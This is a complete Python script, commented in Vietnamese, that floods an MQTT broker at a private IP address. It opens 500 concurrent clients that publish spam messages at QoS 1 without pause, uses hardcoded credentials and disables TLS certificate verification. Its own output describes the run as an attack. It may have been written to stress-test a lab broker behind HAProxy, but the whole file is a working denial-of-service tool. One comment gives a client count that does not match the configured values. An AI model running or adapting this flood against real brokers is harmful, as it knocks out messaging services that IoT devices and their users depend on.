from xmlrpc import client

import paho.mqtt.client as mqtt
from paho.mqtt.enums import CallbackAPIVersion
import time
import multiprocessing
import threading
import signal
import sys
import ssl

# --- CẤU HÌNH ---

TARGET_IP = "192.168.197.129"
TARGET_PORT = 8883  # Đổi thành cổng của HAProxy nếu muốn test qua Proxy
NUM_PROCESSES = 4   # Số lượng tiến trình (nên bằng số core CPU máy bạn)
CLIENTS_PER_PROCESS = 125      # Tổng cộng 200 clients (4 * 50)
TOPIC = "attack/topic"
PAYLOAD = "Spam message payload"
USER = "user1"
PASS = "123"

# --- CẤU HÌNH TLS ---
# Để bật/tắt TLS, chỉ cần comment hoặc uncomment dòng dưới:
USE_TLS = True  # Đổi thành True nếu muốn dùng TLS (ví dụ khi dùng cổng 8883)

def create_client(client_id, stop_event):
    """Khởi tạo một client và thực hiện gửi tin nhắn"""

    client = mqtt.Client(CallbackAPIVersion.VERSION2, client_id=f"AttackClient_{client_id}")
    client.username_pw_set(USER, PASS)

    if USE_TLS:
        client.tls_set(cert_reqs=ssl.CERT_NONE)
        client.tls_insecure_set(True)

    try:
        # Giảm thời gian keepalive để tạo áp lực lên việc quản lý session
        client.connect(TARGET_IP, TARGET_PORT, keepalive=10)
        client.loop_start()
        
        while not stop_event.is_set():
            # Gửi với QoS 1 để yêu cầu Broker phải phản hồi (tốn tài nguyên hơn)
            info = client.publish(TOPIC, PAYLOAD, qos=1)
            info.wait_for_publish() # Đợi gửi xong mới gửi tiếp để không làm tràn buffer local
            # time.sleep(0.01) # Điều chỉnh độ trễ để kiểm soát cường độ
            
        client.loop_stop()
        client.disconnect()
    except Exception:
        pass

def worker_task(start_idx, count, stop_event):
    """Hàm chạy trong mỗi tiến trình"""
    # Bỏ qua SIGINT trong tiến trình con để tiến trình chính tự xử lý
    signal.signal(signal.SIGINT, signal.SIG_IGN)
    
    threads = []
    # Dùng threads cho các client thay vì process để giảm overhead và dễ dừng hơn
    for i in range(start_idx, start_idx + count):
        t = threading.Thread(target=create_client, args=(i, stop_event))
        t.daemon = True
        t.start()
        threads.append(t)
    
    # Chờ cho đến khi có tín hiệu dừng
    stop_event.wait()
    
    # Đợi các threads kết thúc
    for t in threads:
        t.join()

if __name__ == "__main__":
    print(f"Đang bắt đầu tấn công vào {TARGET_IP}:{TARGET_PORT}...")
    print(f"Tổng số clients: {NUM_PROCESSES * CLIENTS_PER_PROCESS}")
    
    manager = multiprocessing.Manager()
    stop_event = manager.Event()
    
    processes = []
    for i in range(NUM_PROCESSES):
        start_idx = i * CLIENTS_PER_PROCESS
        p = multiprocessing.Process(target=worker_task, args=(start_idx, CLIENTS_PER_PROCESS, stop_event))
        p.start()
        processes.append(p)

    def signal_handler(sig, frame):
        print("\nĐang dừng tấn công, vui lòng chờ các kết nối đóng lại an toàn...")
        stop_event.set()
        for p in processes:
            p.join(timeout=3)
            if p.is_alive():
                p.terminate()
                p.join()
        print("Đã dừng thành công.")
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Giữ tiến trình chính chạy để đợi Ctrl+C
    while True:
        try:
            time.sleep(1)
        except KeyboardInterrupt:
            pass # signal_handler sẽ lo việc này